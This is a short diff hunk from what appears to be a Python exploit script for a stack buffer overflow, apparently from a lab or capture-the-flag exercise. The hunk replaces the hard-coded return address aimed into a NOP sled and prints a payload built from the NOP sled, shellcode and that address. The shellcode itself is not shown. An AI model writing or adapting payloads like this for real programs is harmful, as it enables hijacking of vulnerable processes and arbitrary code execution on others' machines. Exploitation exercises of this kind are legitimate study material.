@@ -21,5 +21,6 @@ NOP = "\x90" * NOP_length_bytes
 
 # Middle of the NOPs
 return_address = "\x50\xdc\xff\xff\xff\x7f\x00\x00"
-
-print NOP + shell_code + return_address
+# 0x 00 00 7f ff ff ff d7 c0
+return_address = "\x80\xd7\xff\xff\xff\x7f\x00\x00"
+print(NOP + shell_code + return_address)
